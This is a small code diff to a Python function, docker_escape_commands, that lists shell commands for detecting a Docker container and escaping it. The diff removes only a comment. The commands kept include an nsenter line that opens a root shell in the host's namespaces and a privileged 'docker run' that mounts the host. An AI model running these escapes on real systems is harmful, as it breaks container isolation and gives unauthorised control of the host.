@@ -68,7 +68,6 @@ def docker_escape_commands() -> list[str]:
         "cat /proc/1/cgroup 2>/dev/null | grep -i docker",
         "ls /.dockerenv 2>/dev/null",
         "ls -la /var/run/docker.sock 2>/dev/null",
-        # Privileged container escape via nsenter
         "nsenter --target 1 --mount --uts --ipc --net --pid -- bash -i 2>/dev/null",
         # Mount host filesystem via privileged docker socket
         "docker run -it --privileged --pid=host --net=host --ipc=host "
